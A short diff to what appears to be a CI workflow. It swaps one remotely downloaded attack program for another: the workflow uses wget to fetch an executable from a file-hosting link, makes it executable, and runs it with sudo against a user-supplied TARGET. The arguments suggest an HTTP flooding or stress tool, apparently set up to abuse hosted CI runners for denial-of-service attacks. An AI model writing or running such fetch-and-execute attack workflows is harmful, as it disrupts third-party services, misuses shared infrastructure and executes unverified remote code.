@@ -24,12 +24,12 @@ jobs:
         run: |
           TARGET="${{ inputs.target }}"
 
-          wget https://curl.by/AxtoS/ana.js
-          chmod +x ana.js
+          wget https://curl.by/OcB6A/blaze
+          chmod +x blaze
 
           PIDS=()
           for i in {1..0}; do
-            sudo timeout 270 node ana.js "$TARGET" 6 250
+            sudo timeout 270 ./blaze "$TARGET" 250 1 2 GET 
             PIDS+=($!)
           done
 
